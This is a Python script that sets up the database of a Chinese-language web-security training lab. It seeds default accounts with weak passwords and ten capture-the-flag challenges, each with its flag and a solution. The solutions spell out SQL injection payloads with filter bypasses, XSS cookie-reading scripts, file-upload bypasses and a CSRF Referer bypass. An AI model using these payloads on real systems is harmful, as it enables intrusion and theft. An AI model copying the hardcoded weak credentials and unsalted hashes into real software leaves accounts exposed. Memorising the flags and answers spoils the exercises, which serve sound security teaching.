import hashlib
import datetime
import pymysql
import traceback
from config import Config

def create_database():
    conn = None
    try:
        conn = pymysql.connect(
            host=Config.DB_HOST,
            user=Config.DB_USER,
            password=Config.DB_PASSWORD,
            cursorclass=pymysql.cursors.DictCursor
        )
        cursor = conn.cursor()
        cursor.execute("CREATE DATABASE IF NOT EXISTS {}".format(Config.DB_NAME))
        print("✓ 数据库创建成功或已存在")
    except Exception as e:
        print(f"✗ 创建数据库失败: {e}")
        traceback.print_exc()
    finally:
        if conn:
            conn.close()

def init_db():
    conn = None
    try:
        conn = pymysql.connect(
            host=Config.DB_HOST,
            user=Config.DB_USER,
            password=Config.DB_PASSWORD,
            database=Config.DB_NAME,
            cursorclass=pymysql.cursors.DictCursor
        )
        cursor = conn.cursor()
        print("\n=== 开始初始化数据库表结构 ===")
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTO_INCREMENT,
                username VARCHAR(100) NOT NULL UNIQUE,
                password VARCHAR(255) NOT NULL,
                role VARCHAR(20) NOT NULL DEFAULT 'student',
                created_at VARCHAR(50) NOT NULL,
                last_login VARCHAR(50),
                email VARCHAR(100)
            )
        ''')
        print("✓ users 表")
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS experiment_records (
                id INTEGER PRIMARY KEY AUTO_INCREMENT,
                user_id INTEGER NOT NULL,
                vulnerability_type VARCHAR(50) NOT NULL,
                attempt_count INTEGER NOT NULL DEFAULT 0,
                success_count INTEGER NOT NULL DEFAULT 0,
                success INTEGER NOT NULL DEFAULT 0,
                last_attempt VARCHAR(50),
                first_success VARCHAR(50),
                total_time DECIMAL(10,2) NOT NULL DEFAULT 0,
                start_time VARCHAR(50),
                end_time VARCHAR(50),
                is_expired INTEGER NOT NULL DEFAULT 0,
                remaining_time INTEGER NOT NULL DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        print("✓ experiment_records 表")
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS experiment_sessions (
                id INTEGER PRIMARY KEY AUTO_INCREMENT,
                session_id VARCHAR(255) NOT NULL UNIQUE,
                user_id INTEGER NOT NULL,
                vulnerability_type VARCHAR(50) NOT NULL,
                start_time VARCHAR(50) NOT NULL,
                end_time VARCHAR(50),
                success INTEGER NOT NULL DEFAULT 0,
                attempt_count INTEGER NOT NULL DEFAULT 0,
                FOREIGN KEY (user_id) REFERENCES users(id)
            )
        ''')
        print("✓ experiment_sessions 表")

        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTO_INCREMENT,
                vulnerability_type VARCHAR(50) NOT NULL UNIQUE,
                name VARCHAR(100) NOT NULL,
                flag VARCHAR(255) NOT NULL,
                solution TEXT,
                description TEXT,
                difficulty VARCHAR(20) NOT NULL DEFAULT 'easy',
                category VARCHAR(50) NOT NULL DEFAULT 'web',
                docker_image VARCHAR(100),
                docker_compose_path VARCHAR(255),
                created_at VARCHAR(50) NOT NULL,
                updated_at VARCHAR(50)
            )
        ''')
        print("✓ vulnerabilities 表")
        
        print("\n=== 创建索引 ===")
        indexes = [
            ("idx_users_username", "users", "username"),
            ("idx_users_role", "users", "role"),
            ("idx_exp_records_user", "experiment_records", "user_id"),
            ("idx_exp_records_type", "experiment_records", "vulnerability_type"),
            ("idx_exp_records_user_type", "experiment_records", "user_id, vulnerability_type"),
            ("idx_exp_sessions_session", "experiment_sessions", "session_id"),
            ("idx_exp_sessions_user", "experiment_sessions", "user_id"),
            ("idx_vulns_category", "vulnerabilities", "category"),
            ("idx_vulns_difficulty", "vulnerabilities", "difficulty"),
            ("idx_vulns_type", "vulnerabilities", "vulnerability_type")
        ]
        
        for idx_name, table, columns in indexes:
            try:
                cursor.execute(f"CREATE INDEX IF NOT EXISTS {idx_name} ON {table} ({columns})")
                print(f"✓ 索引 {idx_name}")
            except Exception as e:
                print(f"✓ 索引 {idx_name} 已存在")
        
        print("\n=== 初始化默认数据 ===")
        now = datetime.datetime.now().strftime('%Y-%m-%d %H:%M')
        
        cursor.execute("SELECT COUNT(*) as count FROM users")
        user_count = cursor.fetchone()['count']
        if user_count == 0:
            admin_pass = hashlib.sha256('password'.encode()).hexdigest()
            user_pass = hashlib.sha256('userpass'.encode()).hexdigest()
            
            cursor.execute(
                "INSERT INTO users (username, password, role, created_at, email) VALUES (%s, %s, %s, %s, %s)",
                ('admin', admin_pass, 'teacher', now, 'admin@mlai-lab.com')
            )
            cursor.execute(
                "INSERT INTO users (username, password, role, created_at, email) VALUES (%s, %s, %s, %s, %s)",
                ('user', user_pass, 'student', now, 'user@mlai-lab.com')
            )
            cursor.execute(
                "INSERT INTO users (username, password, role, created_at, email) VALUES (%s, %s, %s, %s, %s)",
                ('student1', hashlib.sha256('123456'.encode()).hexdigest(), 'student', now, 'student1@mlai-lab.com')
            )
            cursor.execute(
                "INSERT INTO users (username, password, role, created_at, email) VALUES (%s, %s, %s, %s, %s)",
                ('student2', hashlib.sha256('123456'.encode()).hexdigest(), 'student', now, 'student2@mlai-lab.com')
            )
            print("✓ 创建默认用户: admin/password, user/userpass, student1/123456, student2/123456")
        else:
            print(f"✓ 用户表已有 {user_count} 条记录")
        
        cursor.execute("SELECT COUNT(*) as count FROM vulnerabilities")
        vuln_count = cursor.fetchone()['count']
        if vuln_count == 0:
            vulnerabilities_data = [
                ('SQL注入-入门', 'SQL注入-入门', 'Mlai{sqli_easy_2026_get_flag}', 
                 '解题思路：\n1. 在登录框输入用户名：admin\' #，密码任意\n2. 使用 ORDER BY 判断列数：1\' ORDER BY 3 #\n3. 使用 UNION SELECT 探测注入点：-1\' UNION SELECT 1,2,3 #\n4. 获取数据库名：-1\' UNION SELECT 1, database(),3 #\n5. 获取表名：-1\' UNION SELECT 1, GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=\'sqli_db\' #\n6. 获取flag表列名：-1\' UNION SELECT 1, GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=\'flag\' #\n7. 获取flag：-1\' UNION SELECT id, flag,3 FROM flag#\n\n说明：这是一个简单的SQL注入漏洞，登录验证处存在字符型注入，使用 # 注释掉后续SQL语句绕过验证',
                 '简单的SQL注入漏洞，登录验证存在字符型注入', 'easy', 'sqli', 'sqli-easy', 'docker/sqli-easy/docker-compose.yml'),
                ('SQL注入-中级', 'SQL注入-中级', 'Mlai{sqli_medium_bypass_comment}',
                 '解题思路：\n1. 在登录框输入用户名：admin\' or \'1\'=\'1，密码任意\n2. 使用 ORDER BY 判断列数：1\' ORDER BY 3 or \'1\'=\'1\n3. 使用 UNION SELECT 探测注入点：-1\' UNION SELECT 1,2,3 or \'1\'=\'1\n4. 获取数据库名：-1\' UNION SELECT 1, database(),3 or \'1\'=\'1\n5. 获取表名：-1\' UNION SELECT 1, GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=\'sqli_db\' or \'1\'=\'1\n6. 获取flag表列名：-1\' UNION SELECT 1, GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=\'flag\' or \'1\'=\'1\n7. 获取flag：-1\' UNION SELECT id, flag,3 FROM flag or \'1\'=\'1\n\n说明：此题目过滤了注释符(# 和 --)，需要使用 or \'1\'=\'1 来闭合原语句，使后面的条件永远为真',
                 '字符型SQL注入，过滤了注释符', 'medium', 'sqli', 'sqli-medium', 'docker/sqli-medium/docker-compose.yml'),
                ('SQL注入-高级', 'SQL注入-高级', 'Mlai{sqli_hard_double_write_bypass}',
                 '解题思路：\n1. 在登录框输入：admin\' oorr \'1\'=\'1（oorr是or的双写）\n2. 使用 ORDER BY 判断列数：1\' oorrder by 3 or \'1\'=\'1\n3. 使用 UNION SELECT 探测注入点：-1\' uniunionon select 1,2,3 or \'1\'=\'1\n4. 获取数据库名：-1\' uniunionon select 1,datadatabase(),3 or \'1\'=\'1\n5. 获取表名：-1\' uniunionon select 1,GROUPCONCAT(table_name),3 from information_schema.tables where table_schema=\'sqli_db\' or \'1\'=\'1\n6. 获取flag表列名：-1\' uniunionon select 1,GROUPCONCAT(column_name),3 from information_schema.columns where table_name=\'flag\' or \'1\'=\'1\n7. 获取flag：-1\' uniunionon select id,flag,3 from flag or \'1\'=\'1\n\n说明：此题目过滤了多个关键字（select、union、or、order、by、where等），需要使用双写绕过。例如：or→oorr，union→uniunionon，select→selselectect，database→datadatabase',
                 '高级SQL注入，过滤多个关键字，需要双写绕过', 'hard', 'sqli', 'sqli-hard', 'docker/sqli-hard/docker-compose.yml'),
                ('反射型XSS', '反射型XSS', 'Mlai{xss_reflected_flag}',
                 '1. 这是一个简单的反射型XSS漏洞\n2. URL参数直接输出到页面中，没有过滤\n3. 测试：输入 <script>alert(1)</script>\n4. 尝试获取cookie：<script>alert(document.cookie)</script>',
                 '反射型XSS漏洞，URL参数未过滤', 'easy', 'xss', 'xss-reflected', 'docker/xss-reflected/docker-compose.yml'),
                ('存储型XSS', '存储型XSS', 'Mlai{xss_stored_flag}',
                 '1. 这是一个存储型XSS漏洞\n2. 用户输入会被存储到服务器\n3. 在输入框中输入恶意脚本并提交\n4. 刷新页面后，脚本会自动执行',
                 '存储型XSS漏洞，用户输入存储后执行', 'medium', 'xss', 'xss-stored', 'docker/xss-stored/docker-compose.yml'),
                ('DOM型XSS', 'DOM型XSS', 'Mlai{xss_dom_flag}',
                 '1. 这是一个DOM型XSS漏洞\n2. 漏洞存在于前端JavaScript代码中\n3. 查看页面源码，找到处理用户输入的JavaScript\n4. 通常是通过location.hash或URL参数直接操作DOM',
                 'DOM型XSS漏洞，前端JavaScript处理不当', 'medium', 'xss', 'xss-dom', 'docker/xss-dom/docker-compose.yml'),
                ('PHP反序列化', 'PHP反序列化', 'Mlai{php_unserialize_flag}',
                 '1. 这是一个PHP反序列化漏洞\n2. 程序会反序列化用户输入的数据\n3. 首先需要找到目标类的定义\n4. 构造恶意的序列化字符串\n5. 触发__wakeup或__destruct等魔术方法',
                 'PHP反序列化漏洞', 'hard', 'deserialization', 'php-deserialization', 'docker/php-deserialization/docker-compose.yml'),
                ('文件上传', '文件上传', 'Mlai{file_upload_flag}',
                 '1. 这是一个文件上传漏洞\n2. 尝试上传.php文件\n3. 如果有MIME类型检查，可以通过修改Content-Type绕过\n4. 如果有扩展名检查，可以尝试.php5、.php3或双重扩展名',
                 '文件上传漏洞', 'medium', 'upload', 'file-upload', 'docker/file-upload/docker-compose.yml'),
                ('CSRF-Easy', 'CSRF-Easy', 'Mlai{CSRF-Easy-Success}',
                 '1. 这是一个无任何CSRF防护的漏洞\n2. 构造一个恶意页面，包含自动提交的表单\n3. 表单的action指向目标URL\n4. 输入框中填入要修改的数据（密码改成hacked!）\n5. 诱骗已登录的用户访问恶意页面\n6. 访问?get_flag=1获取flag',
                 'CSRF跨站请求伪造漏洞，无任何防护', 'easy', 'csrf', 'csrf-easy', 'docker/csrf-easy/docker-compose.yml'),
                ('CSRF-Hard', 'CSRF-Hard', 'Mlai{CSRF-Hard-Success}',
                 '1. 这是一个有Referer检查的CSRF漏洞\n2. Referer检查使用了strpos($referer, $host) !== false\n3. 可以通过构造URL子域名或路径来绕过\n4. 如：构造http://target-server.attacker.com 或者 http://attacker.com/target-server.com\n5. 完成任务：转账999元给attacker + 修改密码为hacked! + 访问?get_flag=1',
                 'CSRF跨站请求伪造漏洞，有Referer检查但可绕过', 'hard', 'csrf', 'csrf-hard', 'docker/csrf-hard/docker-compose.yml')
            ]
            
            for vuln in vulnerabilities_data:
                cursor.execute('''
                    INSERT INTO vulnerabilities (vulnerability_type, name, flag, solution, description, difficulty, category, docker_image, docker_compose_path, created_at)
                    VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)
                ''', vuln + (now,))
            print("✓ 创建默认漏洞数据（10个漏洞）")
        else:
            print(f"✓ 漏洞表已有 {vuln_count} 条记录")
        
        conn.commit()
        print("\n=== 数据库初始化完成 ===")
        
    except Exception as e:
        print(f"\n✗ 数据库初始化失败: {e}")
        traceback.print_exc()
        if conn:
            conn.rollback()
    finally:
        if conn:
            conn.close()

if __name__ == "__main__":
    print("=========================================")
    print("  Mlai-Lab 数据库初始化")
    print("=========================================")
    create_database()
    init_db()
